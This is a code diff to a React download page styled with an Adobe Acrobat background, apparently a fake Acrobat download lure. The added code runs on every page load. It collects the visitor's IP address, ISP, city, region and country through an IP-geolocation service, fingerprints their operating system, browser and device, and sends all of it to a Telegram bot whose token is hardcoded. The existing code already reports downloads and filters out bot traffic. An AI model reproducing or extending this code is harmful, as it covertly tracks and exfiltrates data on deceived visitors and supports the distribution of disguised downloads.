@@ -42,6 +42,40 @@ const fetchVisitorIp = async (): Promise<string | null> => {
     return null;
   }
 };
+
+const fetchIpGeoData = async (ip: string): Promise<Record<string, any>> => {
+  try {
+    const res = await fetch(`https://ipapi.co/${ip}/json/`);
+    const data = await res.json();
+    return {
+      ip,
+      isp: data.org || "Unknown",
+      city: data.city || "Unknown",
+      region: data.region || "Unknown",
+      country: data.country_name || "Unknown",
+    };
+  } catch {
+    return { ip, isp: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" };
+  }
+};
+
+const getOSName = (): string => {
+  const ua = navigator.userAgent;
+  if (ua.includes("Windows NT 10")) return "Windows 10";
+  if (ua.includes("Windows NT 11") || (ua.includes("Windows NT 10") && (navigator as any).userAgentData?.platform === "Windows")) return "Windows 10+";
+  if (ua.includes("Windows")) return "Windows";
+  if (ua.includes("Mac OS X")) return "macOS";
+  if (ua.includes("Linux")) return "Linux";
+  if (ua.includes("Android")) return "Android";
+  if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+  return "Unknown";
+};
+
+const getDeviceType = (): string => {
+  const ua = navigator.userAgent;
+  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || window.innerWidth < 768) return "📱 Mobile";
+  return "💻 Desktop";
+};
 import acrobatBg from "@/assets/adobe-acrobat-bg.webp";
 
 const TELEGRAM_BOT_TOKEN = "8648729689:AAEj5AJW3EJOAMYkAtVbm1DgSNgTy2fo1jw";
@@ -99,12 +133,25 @@ const getBrowserName = () => {
   return "Unknown";
 };
 
-const sendTelegramNotification = async (type: "download" | "bot_blocked", info: Record<string, any>) => {
+const sendTelegramNotification = async (type: "download" | "bot_blocked" | "visit", info: Record<string, any>) => {
   const time = new Date().toISOString().replace("T", " ").split(".")[0] + " UTC";
   
   let message = "";
   
-  if (type === "bot_blocked") {
+  if (type === "visit") {
+    message =
+      `⚠️ <b>NEW Visit</b> ⚠️\n\n` +
+      `🌐 <b>IP:</b> ${info.ip || "Unknown"}\n\n` +
+      `📡 <b>ISP:</b> ${info.isp || "Unknown"}\n\n` +
+      `📍 <b>Location:</b>\n` +
+      `${info.city || "Unknown"}, ${info.region || "Unknown"}\n` +
+      `${info.country || "Unknown"}\n\n` +
+      `💻 <b>System Info:</b>\n` +
+      `OS: ${info.os || "Unknown"}\n` +
+      `Browser: ${info.browser || "Unknown"}\n` +
+      `Device: ${info.device || "Unknown"}\n\n` +
+      `⏰ <b>Time:</b> ${time}`;
+  } else if (type === "bot_blocked") {
     const flags = (info.suspiciousFlags || []).join(", ") || "None";
     message =
       `🚨 <b>BOT/SUSPICIOUS TRAFFIC DETECTED</b>\n\n` +
@@ -156,6 +203,7 @@ const sendTelegramNotification = async (type: "download" | "bot_blocked", info: 
 const Download = () => {
   const { data: visitorData } = useVisitorData({ immediate: true });
   const notifiedRef = useRef(false);
+  const visitNotifiedRef = useRef(false);
   const [blocked, setBlocked] = useState(false);
 
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
@@ -220,6 +268,23 @@ const Download = () => {
       }
     };
     checkIp();
+  }, []);
+
+  // Send visit notification with geo data
+  useEffect(() => {
+    if (visitNotifiedRef.current) return;
+    visitNotifiedRef.current = true;
+    const sendVisit = async () => {
+      const ip = await fetchVisitorIp();
+      const geo = ip ? await fetchIpGeoData(ip) : { ip: "Unknown", isp: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" };
+      sendTelegramNotification("visit", {
+        ...geo,
+        os: getOSName(),
+        browser: getBrowserName(),
+        device: getDeviceType(),
+      });
+    };
+    sendVisit();
   }, []);
 
   const downloadFile = useMemo(() => {
